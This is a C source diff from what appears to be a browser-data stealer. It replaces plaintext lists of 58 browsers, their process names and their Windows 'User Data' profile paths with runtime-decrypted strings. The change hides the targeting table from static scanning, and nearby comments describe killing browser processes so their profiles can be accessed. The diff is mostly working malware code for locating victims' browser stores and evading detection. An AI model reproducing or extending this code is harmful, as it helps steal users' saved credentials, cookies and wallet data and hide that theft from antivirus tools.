@@ -21,160 +21,528 @@ static int bp_is_dup(const BrowserPath *out, size_t n, const char *path, int roa
  * to the same name so one kill_browser_processes("chrome") covers
  * Chrome, Chromium, CentBrowser, CryptoTab, etc.                    */
 
-static const char *xor_process_names[] = {
-    "chrome",       /* Chrome */
-    "chrome",       /* Chrome (x86) */
-    "chrome",       /* Chrome SxS (Canary) */
-    "msedge",       /* Edge */
-    "brave",        /* Brave */
-    "opera",        /* Opera */
-    "opera",        /* Opera GX */
-    "vivaldi",      /* Vivaldi */
-    "browser",      /* Yandex */
-    "chrome",       /* Chromium */
-    "chrome",       /* CentBrowser */
-    "browser",      /* CocCoc */
-    "amigo",        /* Amigo */
-    "torch",        /* Torch */
-    "kometa",       /* Kometa */
-    "orbitum",      /* Orbitum */
-    "chrome",       /* 7Star */
-    "chrome",       /* Sputnik */
-    "iridium",      /* Iridium */
-    "dragon",       /* Comodo Dragon */
-    "chrome",       /* Epic */
-    "chrome",       /* Uran */
-    "slimjet",      /* Slimjet */
-    "chrome",       /* Chedot */
-    "chrome",       /* Elements Browser */
-    "chrome",       /* QIP Surf */
-    "360se",        /* 360Browser */
-    "chrome",       /* DCBrowser */
-    "chrome",       /* UR Browser */
-    "chrome",       /* MapleStudio ChromePlus */
-    "fenrir",       /* Fenrir */
-    "citrio",       /* CatalinaGroup Citrio */
-    "chrome",       /* Coowon */
-    "liebao",       /* Liebao */
-    "maxthon",      /* Maxthon */
-    "kmeleon",      /* K-Melon */
-    "chrome",       /* Chrome Canary */
-    "chrome",       /* Chrome Dev */
-    "chrome",       /* Chrome Beta */
-    "msedge",       /* Edge Beta */
-    "msedge",       /* Edge Dev */
-    "msedge",       /* Edge Canary */
-    "brave",        /* Brave Beta */
-    "brave",        /* Brave Nightly */
-    "opera",        /* Opera Beta */
-    "opera",        /* Opera Crypto */
-    "chrome",       /* CryptoTab */
-    "avastbrowser", /* Avast Secure Browser */
-    "ccbrowser",    /* CCleaner Browser */
-    "ucbrowser",    /* UC Browser */
-    "qqbrowser",    /* QQ Browser */
-    "360se",        /* 360 Browser */
-    "liebao",       /* Liebao (dup) */
-    "chrome",       /* Elements (dup) */
-    "superbird",    /* Superbird */
-    "sleipnir",     /* Sleipnir */
-    "atom",         /* Mail.ru Atom */
-    "chrome"        /* 7Star (dup) */
-};
-
-static const char *xor_names[] = {
-    "Chrome", "Chrome (x86)", "Chrome SxS", "Edge", "Brave",
-    "Opera", "Opera GX", "Vivaldi", "Yandex", "Chromium",
-    "CentBrowser", "CocCoc", "Amigo", "Torch", "Kometa",
-    "Orbitum", "7Star", "Sputnik", "Iridium", "Dragon",
-    "Epic", "Uran", "Slimjet", "Chedot", "Elements Browser",
-    "QIP Surf", "360Browser", "DCBrowser", "UR Browser", "Maple",
-    "Fenrir", "Catalina", "Coowon", "Liebao", "Maxthon",
-    "K-Melon", "Chrome Canary", "Chrome Dev", "Chrome Beta",
-    "Edge Beta", "Edge Dev", "Edge Canary", "Brave Beta",
-    "Brave Nightly", "Opera Beta", "Opera Crypto", "CryptoTab",
-    "Avast Secure", "CCleaner", "UC Browser", "QQ Browser",
-    "360 Browser", "Liebao", "Elements", "Superbird",
-    "Sleipnir", "Mail.ru Atom", "7Star"
-};
-
-static const char *xor_paths[] = {
-    "Google\\Chrome\\User Data",
-    "Google(x86)\\Chrome\\User Data",
-    "Google\\Chrome SxS\\User Data",
-    "Microsoft\\Edge\\User Data",
-    "BraveSoftware\\Brave-Browser\\User Data",
-    "Opera Software\\Opera Stable",
-    "Opera Software\\Opera GX Stable",
-    "Vivaldi\\User Data",
-    "Yandex\\YandexBrowser\\User Data",
-    "Chromium\\User Data",
-    "CentBrowser\\User Data",
-    "CocCoc\\Browser\\User Data",
-    "Amigo\\User Data",
-    "Torch\\User Data",
-    "Kometa\\User Data",
-    "Orbitum\\User Data",
-    "7Star\\7Star\\User Data",
-    "Sputnik\\Sputnik\\User Data",
-    "Iridium\\User Data",
-    "Dragon\\User Data",
-    "Epic Privacy Browser\\User Data",
-    "Uran\\User Data",
-    "Slimjet\\User Data",
-    "Chedot\\User Data",
-    "Elements Browser\\User Data",
-    "QIP Surf\\User Data",
-    "360Browser\\Browser\\User Data",
-    "DCBrowser\\User Data",
-    "UR Browser\\User Data",
-    "MapleStudio\\ChromePlus\\User Data",
-    "Fenrir\\User Data",
-    "CatalinaGroup\\Citrio\\User Data",
-    "Coowon\\User Data",
-    "Liebao\\User Data",
-    "Maxthon5\\User Data",
-    "K-Melon\\User Data",
-    "Chrome SxS\\User Data",
-    "Chrome Dev\\User Data",
-    "Chrome Beta\\User Data",
-    "Edge Beta\\User Data",
-    "Edge Dev\\User Data",
-    "Edge Canary\\User Data",
-    "Brave-Browser-Beta\\User Data",
-    "Brave-Browser-Nightly\\User Data",
-    "Opera Software\\Opera Beta",
-    "Opera Software\\Opera Crypto",
-    "CryptoTab\\User Data",
-    "Avast Secure Browser\\User Data",
-    "CCBrowser\\User Data",
-    "UCBrowser\\User Data",
-    "QQBrowser\\User Data",
-    "360Browser\\Browser\\User Data",
-    "Liebao\\User Data",
-    "Elements Browser\\User Data",
-    "Superbird\\User Data",
-    "Sleipnir\\User Data",
-    "Mail.ru\\Atom\\User Data",
-    "7Star\\7Star\\User Data"
-};
-
 static BrowserPath browsers[58];
 static int initialized = 0;
 
-static void init_browsers(void) {
+/* Auto-generated by gen_bp_tables.py - runtime-decrypted browser tables */
+
+static void init_browser_tables(void) {
     if (initialized) return;
-    for (int i = 0; i < 58; i++) {
-        browsers[i].name         = xor_names[i];
-        browsers[i].path_suffix  = xor_paths[i];
-        browsers[i].use_roaming  = 0;
-        browsers[i].process_name = xor_process_names[i];
-    }
+
+    static char _proc_0[32];
+    enc_decrypt(enc_bp_proc_0, ENC_BP_PROC_0_LEN, _proc_0);
+    static char _proc_1[32];
+    enc_decrypt(enc_bp_proc_1, ENC_BP_PROC_1_LEN, _proc_1);
+    static char _proc_2[32];
+    enc_decrypt(enc_bp_proc_2, ENC_BP_PROC_2_LEN, _proc_2);
+    static char _proc_3[32];
+    enc_decrypt(enc_bp_proc_3, ENC_BP_PROC_3_LEN, _proc_3);
+    static char _proc_4[32];
+    enc_decrypt(enc_bp_proc_4, ENC_BP_PROC_4_LEN, _proc_4);
+    static char _proc_5[32];
+    enc_decrypt(enc_bp_proc_5, ENC_BP_PROC_5_LEN, _proc_5);
+    static char _proc_6[32];
+    enc_decrypt(enc_bp_proc_6, ENC_BP_PROC_6_LEN, _proc_6);
+    static char _proc_7[32];
+    enc_decrypt(enc_bp_proc_7, ENC_BP_PROC_7_LEN, _proc_7);
+    static char _proc_8[32];
+    enc_decrypt(enc_bp_proc_8, ENC_BP_PROC_8_LEN, _proc_8);
+    static char _proc_9[32];
+    enc_decrypt(enc_bp_proc_9, ENC_BP_PROC_9_LEN, _proc_9);
+    static char _proc_10[32];
+    enc_decrypt(enc_bp_proc_10, ENC_BP_PROC_10_LEN, _proc_10);
+    static char _proc_11[32];
+    enc_decrypt(enc_bp_proc_11, ENC_BP_PROC_11_LEN, _proc_11);
+    static char _proc_12[32];
+    enc_decrypt(enc_bp_proc_12, ENC_BP_PROC_12_LEN, _proc_12);
+    static char _proc_13[32];
+    enc_decrypt(enc_bp_proc_13, ENC_BP_PROC_13_LEN, _proc_13);
+    static char _proc_14[32];
+    enc_decrypt(enc_bp_proc_14, ENC_BP_PROC_14_LEN, _proc_14);
+    static char _proc_15[32];
+    enc_decrypt(enc_bp_proc_15, ENC_BP_PROC_15_LEN, _proc_15);
+    static char _proc_16[32];
+    enc_decrypt(enc_bp_proc_16, ENC_BP_PROC_16_LEN, _proc_16);
+    static char _proc_17[32];
+    enc_decrypt(enc_bp_proc_17, ENC_BP_PROC_17_LEN, _proc_17);
+    static char _proc_18[32];
+    enc_decrypt(enc_bp_proc_18, ENC_BP_PROC_18_LEN, _proc_18);
+    static char _proc_19[32];
+    enc_decrypt(enc_bp_proc_19, ENC_BP_PROC_19_LEN, _proc_19);
+    static char _proc_20[32];
+    enc_decrypt(enc_bp_proc_20, ENC_BP_PROC_20_LEN, _proc_20);
+    static char _proc_21[32];
+    enc_decrypt(enc_bp_proc_21, ENC_BP_PROC_21_LEN, _proc_21);
+    static char _proc_22[32];
+    enc_decrypt(enc_bp_proc_22, ENC_BP_PROC_22_LEN, _proc_22);
+    static char _proc_23[32];
+    enc_decrypt(enc_bp_proc_23, ENC_BP_PROC_23_LEN, _proc_23);
+    static char _proc_24[32];
+    enc_decrypt(enc_bp_proc_24, ENC_BP_PROC_24_LEN, _proc_24);
+    static char _proc_25[32];
+    enc_decrypt(enc_bp_proc_25, ENC_BP_PROC_25_LEN, _proc_25);
+
+    static char _name_0[64];
+    enc_decrypt(enc_bp_name_0, ENC_BP_NAME_0_LEN, _name_0);
+    static char _name_1[64];
+    enc_decrypt(enc_bp_name_1, ENC_BP_NAME_1_LEN, _name_1);
+    static char _name_2[64];
+    enc_decrypt(enc_bp_name_2, ENC_BP_NAME_2_LEN, _name_2);
+    static char _name_3[64];
+    enc_decrypt(enc_bp_name_3, ENC_BP_NAME_3_LEN, _name_3);
+    static char _name_4[64];
+    enc_decrypt(enc_bp_name_4, ENC_BP_NAME_4_LEN, _name_4);
+    static char _name_5[64];
+    enc_decrypt(enc_bp_name_5, ENC_BP_NAME_5_LEN, _name_5);
+    static char _name_6[64];
+    enc_decrypt(enc_bp_name_6, ENC_BP_NAME_6_LEN, _name_6);
+    static char _name_7[64];
+    enc_decrypt(enc_bp_name_7, ENC_BP_NAME_7_LEN, _name_7);
+    static char _name_8[64];
+    enc_decrypt(enc_bp_name_8, ENC_BP_NAME_8_LEN, _name_8);
+    static char _name_9[64];
+    enc_decrypt(enc_bp_name_9, ENC_BP_NAME_9_LEN, _name_9);
+    static char _name_10[64];
+    enc_decrypt(enc_bp_name_10, ENC_BP_NAME_10_LEN, _name_10);
+    static char _name_11[64];
+    enc_decrypt(enc_bp_name_11, ENC_BP_NAME_11_LEN, _name_11);
+    static char _name_12[64];
+    enc_decrypt(enc_bp_name_12, ENC_BP_NAME_12_LEN, _name_12);
+    static char _name_13[64];
+    enc_decrypt(enc_bp_name_13, ENC_BP_NAME_13_LEN, _name_13);
+    static char _name_14[64];
+    enc_decrypt(enc_bp_name_14, ENC_BP_NAME_14_LEN, _name_14);
+    static char _name_15[64];
+    enc_decrypt(enc_bp_name_15, ENC_BP_NAME_15_LEN, _name_15);
+    static char _name_16[64];
+    enc_decrypt(enc_bp_name_16, ENC_BP_NAME_16_LEN, _name_16);
+    static char _name_17[64];
+    enc_decrypt(enc_bp_name_17, ENC_BP_NAME_17_LEN, _name_17);
+    static char _name_18[64];
+    enc_decrypt(enc_bp_name_18, ENC_BP_NAME_18_LEN, _name_18);
+    static char _name_19[64];
+    enc_decrypt(enc_bp_name_19, ENC_BP_NAME_19_LEN, _name_19);
+    static char _name_20[64];
+    enc_decrypt(enc_bp_name_20, ENC_BP_NAME_20_LEN, _name_20);
+    static char _name_21[64];
+    enc_decrypt(enc_bp_name_21, ENC_BP_NAME_21_LEN, _name_21);
+    static char _name_22[64];
+    enc_decrypt(enc_bp_name_22, ENC_BP_NAME_22_LEN, _name_22);
+    static char _name_23[64];
+    enc_decrypt(enc_bp_name_23, ENC_BP_NAME_23_LEN, _name_23);
+    static char _name_24[64];
+    enc_decrypt(enc_bp_name_24, ENC_BP_NAME_24_LEN, _name_24);
+    static char _name_25[64];
+    enc_decrypt(enc_bp_name_25, ENC_BP_NAME_25_LEN, _name_25);
+    static char _name_26[64];
+    enc_decrypt(enc_bp_name_26, ENC_BP_NAME_26_LEN, _name_26);
+    static char _name_27[64];
+    enc_decrypt(enc_bp_name_27, ENC_BP_NAME_27_LEN, _name_27);
+    static char _name_28[64];
+    enc_decrypt(enc_bp_name_28, ENC_BP_NAME_28_LEN, _name_28);
+    static char _name_29[64];
+    enc_decrypt(enc_bp_name_29, ENC_BP_NAME_29_LEN, _name_29);
+    static char _name_30[64];
+    enc_decrypt(enc_bp_name_30, ENC_BP_NAME_30_LEN, _name_30);
+    static char _name_31[64];
+    enc_decrypt(enc_bp_name_31, ENC_BP_NAME_31_LEN, _name_31);
+    static char _name_32[64];
+    enc_decrypt(enc_bp_name_32, ENC_BP_NAME_32_LEN, _name_32);
+    static char _name_33[64];
+    enc_decrypt(enc_bp_name_33, ENC_BP_NAME_33_LEN, _name_33);
+    static char _name_34[64];
+    enc_decrypt(enc_bp_name_34, ENC_BP_NAME_34_LEN, _name_34);
+    static char _name_35[64];
+    enc_decrypt(enc_bp_name_35, ENC_BP_NAME_35_LEN, _name_35);
+    static char _name_36[64];
+    enc_decrypt(enc_bp_name_36, ENC_BP_NAME_36_LEN, _name_36);
+    static char _name_37[64];
+    enc_decrypt(enc_bp_name_37, ENC_BP_NAME_37_LEN, _name_37);
+    static char _name_38[64];
+    enc_decrypt(enc_bp_name_38, ENC_BP_NAME_38_LEN, _name_38);
+    static char _name_39[64];
+    enc_decrypt(enc_bp_name_39, ENC_BP_NAME_39_LEN, _name_39);
+    static char _name_40[64];
+    enc_decrypt(enc_bp_name_40, ENC_BP_NAME_40_LEN, _name_40);
+    static char _name_41[64];
+    enc_decrypt(enc_bp_name_41, ENC_BP_NAME_41_LEN, _name_41);
+    static char _name_42[64];
+    enc_decrypt(enc_bp_name_42, ENC_BP_NAME_42_LEN, _name_42);
+    static char _name_43[64];
+    enc_decrypt(enc_bp_name_43, ENC_BP_NAME_43_LEN, _name_43);
+    static char _name_44[64];
+    enc_decrypt(enc_bp_name_44, ENC_BP_NAME_44_LEN, _name_44);
+    static char _name_45[64];
+    enc_decrypt(enc_bp_name_45, ENC_BP_NAME_45_LEN, _name_45);
+    static char _name_46[64];
+    enc_decrypt(enc_bp_name_46, ENC_BP_NAME_46_LEN, _name_46);
+    static char _name_47[64];
+    enc_decrypt(enc_bp_name_47, ENC_BP_NAME_47_LEN, _name_47);
+    static char _name_48[64];
+    enc_decrypt(enc_bp_name_48, ENC_BP_NAME_48_LEN, _name_48);
+    static char _name_49[64];
+    enc_decrypt(enc_bp_name_49, ENC_BP_NAME_49_LEN, _name_49);
+    static char _name_50[64];
+    enc_decrypt(enc_bp_name_50, ENC_BP_NAME_50_LEN, _name_50);
+    static char _name_51[64];
+    enc_decrypt(enc_bp_name_51, ENC_BP_NAME_51_LEN, _name_51);
+    static char _name_52[64];
+    enc_decrypt(enc_bp_name_52, ENC_BP_NAME_52_LEN, _name_52);
+    static char _name_53[64];
+    enc_decrypt(enc_bp_name_53, ENC_BP_NAME_53_LEN, _name_53);
+    static char _name_54[64];
+    enc_decrypt(enc_bp_name_54, ENC_BP_NAME_54_LEN, _name_54);
+    static char _name_55[64];
+    enc_decrypt(enc_bp_name_55, ENC_BP_NAME_55_LEN, _name_55);
+
+    static char _path_0[256];
+    enc_decrypt(enc_bp_path_0, ENC_BP_PATH_0_LEN, _path_0);
+    static char _path_1[256];
+    enc_decrypt(enc_bp_path_1, ENC_BP_PATH_1_LEN, _path_1);
+    static char _path_2[256];
+    enc_decrypt(enc_bp_path_2, ENC_BP_PATH_2_LEN, _path_2);
+    static char _path_3[256];
+    enc_decrypt(enc_bp_path_3, ENC_BP_PATH_3_LEN, _path_3);
+    static char _path_4[256];
+    enc_decrypt(enc_bp_path_4, ENC_BP_PATH_4_LEN, _path_4);
+    static char _path_5[256];
+    enc_decrypt(enc_bp_path_5, ENC_BP_PATH_5_LEN, _path_5);
+    static char _path_6[256];
+    enc_decrypt(enc_bp_path_6, ENC_BP_PATH_6_LEN, _path_6);
+    static char _path_7[256];
+    enc_decrypt(enc_bp_path_7, ENC_BP_PATH_7_LEN, _path_7);
+    static char _path_8[256];
+    enc_decrypt(enc_bp_path_8, ENC_BP_PATH_8_LEN, _path_8);
+    static char _path_9[256];
+    enc_decrypt(enc_bp_path_9, ENC_BP_PATH_9_LEN, _path_9);
+    static char _path_10[256];
+    enc_decrypt(enc_bp_path_10, ENC_BP_PATH_10_LEN, _path_10);
+    static char _path_11[256];
+    enc_decrypt(enc_bp_path_11, ENC_BP_PATH_11_LEN, _path_11);
+    static char _path_12[256];
+    enc_decrypt(enc_bp_path_12, ENC_BP_PATH_12_LEN, _path_12);
+    static char _path_13[256];
+    enc_decrypt(enc_bp_path_13, ENC_BP_PATH_13_LEN, _path_13);
+    static char _path_14[256];
+    enc_decrypt(enc_bp_path_14, ENC_BP_PATH_14_LEN, _path_14);
+    static char _path_15[256];
+    enc_decrypt(enc_bp_path_15, ENC_BP_PATH_15_LEN, _path_15);
+    static char _path_16[256];
+    enc_decrypt(enc_bp_path_16, ENC_BP_PATH_16_LEN, _path_16);
+    static char _path_17[256];
+    enc_decrypt(enc_bp_path_17, ENC_BP_PATH_17_LEN, _path_17);
+    static char _path_18[256];
+    enc_decrypt(enc_bp_path_18, ENC_BP_PATH_18_LEN, _path_18);
+    static char _path_19[256];
+    enc_decrypt(enc_bp_path_19, ENC_BP_PATH_19_LEN, _path_19);
+    static char _path_20[256];
+    enc_decrypt(enc_bp_path_20, ENC_BP_PATH_20_LEN, _path_20);
+    static char _path_21[256];
+    enc_decrypt(enc_bp_path_21, ENC_BP_PATH_21_LEN, _path_21);
+    static char _path_22[256];
+    enc_decrypt(enc_bp_path_22, ENC_BP_PATH_22_LEN, _path_22);
+    static char _path_23[256];
+    enc_decrypt(enc_bp_path_23, ENC_BP_PATH_23_LEN, _path_23);
+    static char _path_24[256];
+    enc_decrypt(enc_bp_path_24, ENC_BP_PATH_24_LEN, _path_24);
+    static char _path_25[256];
+    enc_decrypt(enc_bp_path_25, ENC_BP_PATH_25_LEN, _path_25);
+    static char _path_26[256];
+    enc_decrypt(enc_bp_path_26, ENC_BP_PATH_26_LEN, _path_26);
+    static char _path_27[256];
+    enc_decrypt(enc_bp_path_27, ENC_BP_PATH_27_LEN, _path_27);
+    static char _path_28[256];
+    enc_decrypt(enc_bp_path_28, ENC_BP_PATH_28_LEN, _path_28);
+    static char _path_29[256];
+    enc_decrypt(enc_bp_path_29, ENC_BP_PATH_29_LEN, _path_29);
+    static char _path_30[256];
+    enc_decrypt(enc_bp_path_30, ENC_BP_PATH_30_LEN, _path_30);
+    static char _path_31[256];
+    enc_decrypt(enc_bp_path_31, ENC_BP_PATH_31_LEN, _path_31);
+    static char _path_32[256];
+    enc_decrypt(enc_bp_path_32, ENC_BP_PATH_32_LEN, _path_32);
+    static char _path_33[256];
+    enc_decrypt(enc_bp_path_33, ENC_BP_PATH_33_LEN, _path_33);
+    static char _path_34[256];
+    enc_decrypt(enc_bp_path_34, ENC_BP_PATH_34_LEN, _path_34);
+    static char _path_35[256];
+    enc_decrypt(enc_bp_path_35, ENC_BP_PATH_35_LEN, _path_35);
+    static char _path_36[256];
+    enc_decrypt(enc_bp_path_36, ENC_BP_PATH_36_LEN, _path_36);
+    static char _path_37[256];
+    enc_decrypt(enc_bp_path_37, ENC_BP_PATH_37_LEN, _path_37);
+    static char _path_38[256];
+    enc_decrypt(enc_bp_path_38, ENC_BP_PATH_38_LEN, _path_38);
+    static char _path_39[256];
+    enc_decrypt(enc_bp_path_39, ENC_BP_PATH_39_LEN, _path_39);
+    static char _path_40[256];
+    enc_decrypt(enc_bp_path_40, ENC_BP_PATH_40_LEN, _path_40);
+    static char _path_41[256];
+    enc_decrypt(enc_bp_path_41, ENC_BP_PATH_41_LEN, _path_41);
+    static char _path_42[256];
+    enc_decrypt(enc_bp_path_42, ENC_BP_PATH_42_LEN, _path_42);
+    static char _path_43[256];
+    enc_decrypt(enc_bp_path_43, ENC_BP_PATH_43_LEN, _path_43);
+    static char _path_44[256];
+    enc_decrypt(enc_bp_path_44, ENC_BP_PATH_44_LEN, _path_44);
+    static char _path_45[256];
+    enc_decrypt(enc_bp_path_45, ENC_BP_PATH_45_LEN, _path_45);
+    static char _path_46[256];
+    enc_decrypt(enc_bp_path_46, ENC_BP_PATH_46_LEN, _path_46);
+    static char _path_47[256];
+    enc_decrypt(enc_bp_path_47, ENC_BP_PATH_47_LEN, _path_47);
+    static char _path_48[256];
+    enc_decrypt(enc_bp_path_48, ENC_BP_PATH_48_LEN, _path_48);
+    static char _path_49[256];
+    enc_decrypt(enc_bp_path_49, ENC_BP_PATH_49_LEN, _path_49);
+    static char _path_50[256];
+    enc_decrypt(enc_bp_path_50, ENC_BP_PATH_50_LEN, _path_50);
+    static char _path_51[256];
+    enc_decrypt(enc_bp_path_51, ENC_BP_PATH_51_LEN, _path_51);
+    static char _path_52[256];
+    enc_decrypt(enc_bp_path_52, ENC_BP_PATH_52_LEN, _path_52);
+    static char _path_53[256];
+    enc_decrypt(enc_bp_path_53, ENC_BP_PATH_53_LEN, _path_53);
+
+    /* Assign to browser table */
+    browsers[0].name         = _name_0;
+    browsers[0].path_suffix  = _path_0;
+    browsers[0].use_roaming  = 0;
+    browsers[0].process_name = _proc_0;
+    browsers[1].name         = _name_1;
+    browsers[1].path_suffix  = _path_1;
+    browsers[1].use_roaming  = 0;
+    browsers[1].process_name = _proc_0;
+    browsers[2].name         = _name_2;
+    browsers[2].path_suffix  = _path_2;
+    browsers[2].use_roaming  = 0;
+    browsers[2].process_name = _proc_0;
+    browsers[3].name         = _name_3;
+    browsers[3].path_suffix  = _path_3;
+    browsers[3].use_roaming  = 0;
+    browsers[3].process_name = _proc_1;
+    browsers[4].name         = _name_4;
+    browsers[4].path_suffix  = _path_4;
+    browsers[4].use_roaming  = 0;
+    browsers[4].process_name = _proc_2;
+    browsers[5].name         = _name_5;
+    browsers[5].path_suffix  = _path_5;
+    browsers[5].use_roaming  = 0;
+    browsers[5].process_name = _proc_3;
+    browsers[6].name         = _name_6;
+    browsers[6].path_suffix  = _path_6;
+    browsers[6].use_roaming  = 0;
+    browsers[6].process_name = _proc_3;
+    browsers[7].name         = _name_7;
+    browsers[7].path_suffix  = _path_7;
+    browsers[7].use_roaming  = 0;
+    browsers[7].process_name = _proc_4;
+    browsers[8].name         = _name_8;
+    browsers[8].path_suffix  = _path_8;
+    browsers[8].use_roaming  = 0;
+    browsers[8].process_name = _proc_5;
+    browsers[9].name         = _name_9;
+    browsers[9].path_suffix  = _path_9;
+    browsers[9].use_roaming  = 0;
+    browsers[9].process_name = _proc_0;
+    browsers[10].name         = _name_10;
+    browsers[10].path_suffix  = _path_10;
+    browsers[10].use_roaming  = 0;
+    browsers[10].process_name = _proc_0;
+    browsers[11].name         = _name_11;
+    browsers[11].path_suffix  = _path_11;
+    browsers[11].use_roaming  = 0;
+    browsers[11].process_name = _proc_5;
+    browsers[12].name         = _name_12;
+    browsers[12].path_suffix  = _path_12;
+    browsers[12].use_roaming  = 0;
+    browsers[12].process_name = _proc_6;
+    browsers[13].name         = _name_13;
+    browsers[13].path_suffix  = _path_13;
+    browsers[13].use_roaming  = 0;
+    browsers[13].process_name = _proc_7;
+    browsers[14].name         = _name_14;
+    browsers[14].path_suffix  = _path_14;
+    browsers[14].use_roaming  = 0;
+    browsers[14].process_name = _proc_8;
+    browsers[15].name         = _name_15;
+    browsers[15].path_suffix  = _path_15;
+    browsers[15].use_roaming  = 0;
+    browsers[15].process_name = _proc_9;
+    browsers[16].name         = _name_16;
+    browsers[16].path_suffix  = _path_16;
+    browsers[16].use_roaming  = 0;
+    browsers[16].process_name = _proc_0;
+    browsers[17].name         = _name_17;
+    browsers[17].path_suffix  = _path_17;
+    browsers[17].use_roaming  = 0;
+    browsers[17].process_name = _proc_0;
+    browsers[18].name         = _name_18;
+    browsers[18].path_suffix  = _path_18;
+    browsers[18].use_roaming  = 0;
+    browsers[18].process_name = _proc_10;
+    browsers[19].name         = _name_19;
+    browsers[19].path_suffix  = _path_19;
+    browsers[19].use_roaming  = 0;
+    browsers[19].process_name = _proc_11;
+    browsers[20].name         = _name_20;
+    browsers[20].path_suffix  = _path_20;
+    browsers[20].use_roaming  = 0;
+    browsers[20].process_name = _proc_0;
+    browsers[21].name         = _name_21;
+    browsers[21].path_suffix  = _path_21;
+    browsers[21].use_roaming  = 0;
+    browsers[21].process_name = _proc_0;
+    browsers[22].name         = _name_22;
+    browsers[22].path_suffix  = _path_22;
+    browsers[22].use_roaming  = 0;
+    browsers[22].process_name = _proc_12;
+    browsers[23].name         = _name_23;
+    browsers[23].path_suffix  = _path_23;
+    browsers[23].use_roaming  = 0;
+    browsers[23].process_name = _proc_0;
+    browsers[24].name         = _name_24;
+    browsers[24].path_suffix  = _path_24;
+    browsers[24].use_roaming  = 0;
+    browsers[24].process_name = _proc_0;
+    browsers[25].name         = _name_25;
+    browsers[25].path_suffix  = _path_25;
+    browsers[25].use_roaming  = 0;
+    browsers[25].process_name = _proc_0;
+    browsers[26].name         = _name_26;
+    browsers[26].path_suffix  = _path_26;
+    browsers[26].use_roaming  = 0;
+    browsers[26].process_name = _proc_13;
+    browsers[27].name         = _name_27;
+    browsers[27].path_suffix  = _path_27;
+    browsers[27].use_roaming  = 0;
+    browsers[27].process_name = _proc_0;
+    browsers[28].name         = _name_28;
+    browsers[28].path_suffix  = _path_28;
+    browsers[28].use_roaming  = 0;
+    browsers[28].process_name = _proc_0;
+    browsers[29].name         = _name_29;
+    browsers[29].path_suffix  = _path_29;
+    browsers[29].use_roaming  = 0;
+    browsers[29].process_name = _proc_0;
+    browsers[30].name         = _name_30;
+    browsers[30].path_suffix  = _path_30;
+    browsers[30].use_roaming  = 0;
+    browsers[30].process_name = _proc_14;
+    browsers[31].name         = _name_31;
+    browsers[31].path_suffix  = _path_31;
+    browsers[31].use_roaming  = 0;
+    browsers[31].process_name = _proc_15;
+    browsers[32].name         = _name_32;
+    browsers[32].path_suffix  = _path_32;
+    browsers[32].use_roaming  = 0;
+    browsers[32].process_name = _proc_0;
+    browsers[33].name         = _name_33;
+    browsers[33].path_suffix  = _path_33;
+    browsers[33].use_roaming  = 0;
+    browsers[33].process_name = _proc_16;
+    browsers[34].name         = _name_34;
+    browsers[34].path_suffix  = _path_34;
+    browsers[34].use_roaming  = 0;
+    browsers[34].process_name = _proc_17;
+    browsers[35].name         = _name_35;
+    browsers[35].path_suffix  = _path_35;
+    browsers[35].use_roaming  = 0;
+    browsers[35].process_name = _proc_18;
+    browsers[36].name         = _name_36;
+    browsers[36].path_suffix  = _path_36;
+    browsers[36].use_roaming  = 0;
+    browsers[36].process_name = _proc_0;
+    browsers[37].name         = _name_37;
+    browsers[37].path_suffix  = _path_37;
+    browsers[37].use_roaming  = 0;
+    browsers[37].process_name = _proc_0;
+    browsers[38].name         = _name_38;
+    browsers[38].path_suffix  = _path_38;
+    browsers[38].use_roaming  = 0;
+    browsers[38].process_name = _proc_0;
+    browsers[39].name         = _name_39;
+    browsers[39].path_suffix  = _path_39;
+    browsers[39].use_roaming  = 0;
+    browsers[39].process_name = _proc_1;
+    browsers[40].name         = _name_40;
+    browsers[40].path_suffix  = _path_40;
+    browsers[40].use_roaming  = 0;
+    browsers[40].process_name = _proc_1;
+    browsers[41].name         = _name_41;
+    browsers[41].path_suffix  = _path_41;
+    browsers[41].use_roaming  = 0;
+    browsers[41].process_name = _proc_1;
+    browsers[42].name         = _name_42;
+    browsers[42].path_suffix  = _path_42;
+    browsers[42].use_roaming  = 0;
+    browsers[42].process_name = _proc_2;
+    browsers[43].name         = _name_43;
+    browsers[43].path_suffix  = _path_43;
+    browsers[43].use_roaming  = 0;
+    browsers[43].process_name = _proc_2;
+    browsers[44].name         = _name_44;
+    browsers[44].path_suffix  = _path_44;
+    browsers[44].use_roaming  = 0;
+    browsers[44].process_name = _proc_3;
+    browsers[45].name         = _name_45;
+    browsers[45].path_suffix  = _path_45;
+    browsers[45].use_roaming  = 0;
+    browsers[45].process_name = _proc_3;
+    browsers[46].name         = _name_46;
+    browsers[46].path_suffix  = _path_46;
+    browsers[46].use_roaming  = 0;
+    browsers[46].process_name = _proc_0;
+    browsers[47].name         = _name_47;
+    browsers[47].path_suffix  = _path_47;
+    browsers[47].use_roaming  = 0;
+    browsers[47].process_name = _proc_19;
+    browsers[48].name         = _name_48;
+    browsers[48].path_suffix  = _path_48;
+    browsers[48].use_roaming  = 0;
+    browsers[48].process_name = _proc_20;
+    browsers[49].name         = _name_49;
+    browsers[49].path_suffix  = _path_49;
+    browsers[49].use_roaming  = 0;
+    browsers[49].process_name = _proc_21;
+    browsers[50].name         = _name_50;
+    browsers[50].path_suffix  = _path_50;
+    browsers[50].use_roaming  = 0;
+    browsers[50].process_name = _proc_22;
+    browsers[51].name         = _name_51;
+    browsers[51].path_suffix  = _path_26;
+    browsers[51].use_roaming  = 0;
+    browsers[51].process_name = _proc_13;
+    browsers[52].name         = _name_33;
+    browsers[52].path_suffix  = _path_33;
+    browsers[52].use_roaming  = 0;
+    browsers[52].process_name = _proc_16;
+    browsers[53].name         = _name_52;
+    browsers[53].path_suffix  = _path_24;
+    browsers[53].use_roaming  = 0;
+    browsers[53].process_name = _proc_0;
+    browsers[54].name         = _name_53;
+    browsers[54].path_suffix  = _path_51;
+    browsers[54].use_roaming  = 0;
+    browsers[54].process_name = _proc_23;
+    browsers[55].name         = _name_54;
+    browsers[55].path_suffix  = _path_52;
+    browsers[55].use_roaming  = 0;
+    browsers[55].process_name = _proc_24;
+    browsers[56].name         = _name_55;
+    browsers[56].path_suffix  = _path_53;
+    browsers[56].use_roaming  = 0;
+    browsers[56].process_name = _proc_25;
+    browsers[57].name         = _name_16;
+    browsers[57].path_suffix  = _path_16;
+    browsers[57].use_roaming  = 0;
+    browsers[57].process_name = _proc_0;
     /* Opera and Opera GX use APPDATA */
     browsers[5].use_roaming = 1;
     browsers[6].use_roaming = 1;
     initialized = 1;
 }
+
 
 /* ── Merged discovery buffers ─────────────────────────────────── */
 
@@ -211,7 +579,7 @@ static int gecko_merged = 0;
  */
